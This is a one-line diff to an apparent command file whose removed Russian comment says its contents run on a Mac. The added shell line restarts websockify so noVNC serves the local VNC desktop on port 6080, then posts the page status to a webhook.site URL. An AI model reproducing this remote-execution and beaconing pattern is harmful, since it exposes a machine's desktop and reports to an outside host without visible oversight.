@@ -1,1 +1,1 @@
-# команды отсюда выполняются на Mac (кэш ~5 мин)
+pkill -f websockify; sleep 1; nohup /tmp/ws/bin/websockify --web /tmp/noVNC-master --heartbeat 30 6080 localhost:5900 > /tmp/websockify2.log 2>&1 & sleep 2; curl -s -o /dev/null -w "local:%{http_code}" http://127.0.0.1:6080/vnc.html | curl -s -m 8 --data-binary @- "https://webhook.site/90c0eea1-f090-4de0-bc21-70a5a68cd769?stage=ws-restart&t=$(date +%s)"
